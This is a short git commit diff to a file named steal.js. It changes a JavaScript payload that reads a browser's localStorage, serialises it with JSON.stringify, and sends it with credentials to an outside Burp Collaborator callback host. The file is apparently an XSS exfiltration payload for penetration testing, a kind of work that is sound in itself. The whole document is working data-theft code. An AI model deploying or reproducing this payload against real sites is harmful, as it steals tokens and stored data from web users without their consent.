acff711eb924ed0608560b2bf3207a49ecb6b180
tstaeg <57662024+tstaeg@users.noreply.github.com>
2020-06-25 13:42:41 +0200

    Update steal.js

--- steal.js
+++ steal.js
@@ -1,7 +1,7 @@
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = function() { if (xhr.readyState == 4){
-console.log("Storage sent: "+localStorage);
+console.log("Storage sent: "+JSON.stringify(localStorage));
 }}
-xhr.open('GET', '//a3egucu8gk0d98yvoxa5j995vw1tpi.burpcollaborator.net/becrop/?data='+localStorage,true);
+xhr.open('GET', '//a3egucu8gk0d98yvoxa5j995vw1tpi.burpcollaborator.net/becrop/?data='+JSON.stringify(localStorage),true);
 xhr.withCredentials = true;xhr.send(null);
 
